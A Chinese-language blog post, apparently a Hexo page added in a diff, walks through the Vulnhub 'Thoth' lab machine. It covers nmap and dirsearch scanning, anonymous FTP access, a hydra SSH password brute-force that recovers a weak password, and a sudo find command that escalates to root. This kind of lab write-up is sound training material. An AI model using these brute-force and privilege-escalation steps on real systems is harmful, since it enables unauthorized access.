@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Vulunhub-Thoth靶场复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulunhub-Thoth">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/35034.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="Vulunhub-Thoth靶场复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a0487cd0e0a243d4f9a729.png">
+<meta property="article:published_time" content="2025-02-03T03:38:15.000Z">
+<meta property="article:modified_time" content="2025-02-03T05:27:23.186Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67a0487cd0e0a243d4f9a729.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/35034.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulunhub-Thoth | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/35034.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulunhub-Thoth
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-03 11:38:15 / 修改时间：13:27:23" itemprop="dateCreated datePublished" datetime="2025-02-03T11:38:15+08:00">2025-02-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67a0487cd0e0a243d4f9a729.png" class="img-topic">
+        </div>
+      
+      
+        <p>Vulunhub-Thoth靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67a0487cd0e0a243d4f9a729.png"></p>
+<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap 192.168.240.0/24 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">03</span> <span class="number">11</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.46</span>)</span><br><span class="line">Host is up (<span class="number">0.00039</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span> open  ftp</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http</span><br><span class="line">MAC <span class="params">Address:</span> FA:DB:E5:E9:<span class="number">94</span>:F7 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host is up (<span class="number">0.010</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span>   open     domain</span><br><span class="line"><span class="number">8081</span><span class="symbol">/tcp</span> filtered blackice-icecap</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>A:ED:<span class="number">9</span>D:<span class="number">97</span>:DA:<span class="number">7</span>E (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host is up (<span class="number">0.00020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh</span><br><span class="line"><span class="number">5000</span><span class="symbol">/tcp</span> open  upnp</span><br><span class="line"><span class="number">5001</span><span class="symbol">/tcp</span> open  commplex-link</span><br><span class="line"><span class="number">7000</span><span class="symbol">/tcp</span> open  afs3-fileserver</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host is up (<span class="number">0.0000040</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">5.36</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>开放了ssh html ftp  并且html也只有一个apache默认界面<br>看看ftp服务能不能匿名登录<br>发现可以登录并且有一个note.txt 说明我们要利用ftp<br>用get把这个文件下载到本地看看什么内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat note.txt             </span><br><span class="line">Dear pwnlab,</span><br><span class="line"></span><br><span class="line">My <span class="type">name</span> <span class="keyword">is</span> jake. Your <span class="keyword">password</span> <span class="keyword">is</span> very weak <span class="keyword">and</span> easily crackable, I think change your <span class="keyword">password</span>.</span><br></pre></td></tr></table></figure></div>
+<p>提示有一个pwnlab用户，并且密码是弱密码</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>扫一下目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://192.168.240.46                </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_192.168.240.46/_25-02-03_13-04-19.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.46</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">20</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">32</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">7</span>B  <span class="operator">-</span> <span class="symbol">/test.php</span>                                         </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">42</span>] <span class="number">301</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="operator">/</span>wordpress<span class="symbol">/</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">1.8</span><span class="operator">/</span>wordpress<span class="symbol">/</span>     </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">42</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">2</span>KB <span class="operator">-</span> <span class="operator">/</span>wordpress<span class="operator">/</span>wp-login.php</span><br></pre></td></tr></table></figure></div>
+<p>有三个目录<br>test.php中没有有用内容，有登录界面<br>结合刚才的用户名用bp爆破一下 但是这个登录界面提交表单之后就报错<br>用wpscan扫描也没有信息<br>既然刚才说pwnlab用户密码是弱密码，就用hydra爆破一下ssh</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.240.46:22 -t 10</span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">use</span> <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** <span class="keyword">ignore</span> laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-03</span> <span class="number">13</span>:<span class="number">13</span>:<span class="number">56</span></span><br><span class="line">[WARNING] Many SSH configurations <span class="keyword">limit</span> the <span class="keyword">number</span> of parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> <span class="keyword">reduce</span> the tasks: <span class="keyword">use</span> -t <span class="number">4</span></span><br><span class="line">[WARNING] Restorefile (you have <span class="number">10</span> seconds <span class="keyword">to</span> abort... (<span class="keyword">use</span> <span class="keyword">option</span> -I <span class="keyword">to</span> skip waiting)) <span class="keyword">from</span> a previous session found, <span class="keyword">to</span> prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] <span class="built_in">max</span> <span class="number">10</span> tasks per <span class="number">1</span> server, overall <span class="number">10</span> tasks, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">1434440</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.240</span><span class="number">.46</span>:<span class="number">22</span>/</span><br><span class="line">[STATUS] <span class="number">165.00</span> tries/<span class="built_in">min</span>, <span class="number">165</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14344234</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">1448</span>:<span class="number">55</span>h, <span class="number">10</span> active</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.240</span><span class="number">.46</span>   login: pwnlab   <span class="keyword">password</span>: babygirl1</span><br><span class="line"><span class="number">1</span> of <span class="number">1</span> target successfully completed, <span class="number">1</span> valid <span class="keyword">password</span> found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-03</span> <span class="number">13</span>:<span class="number">15</span>:<span class="number">39</span></span><br></pre></td></tr></table></figure>
+<p>成功拿到shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwnlab<span class="variable">@thothtech</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> pwnlab on <span class="symbol">thothtech:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> pwnlab may run the following commands on <span class="symbol">thothtech:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/find</span><br></pre></td></tr></table></figure></div>
+<p>有find的sudo权限<br>找到find的提权方式</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure></div>
+<p>-quit指令让find找到第一个匹配项之后就立即退出</p>
+<p>拿到root权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwnlab<span class="variable">@thothtech</span><span class="symbol">:~</span><span class="variable">$ </span>sudo find . -exec /bin/bash \; -quit</span><br><span class="line">root<span class="variable">@thothtech</span><span class="symbol">:/home/pwnlab</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
+
+<p>非常简单的一个靶机，果然适合新手</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/35034.html" title="Vulunhub-Thoth">https://guayu-kakeru.github.io/posts/35034.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/43260.html" rel="prev" title="HMV-helium">
+      <i class="fa fa-chevron-left"></i> HMV-helium
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/59637.html" rel="next" title="panghu">
+      panghu <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
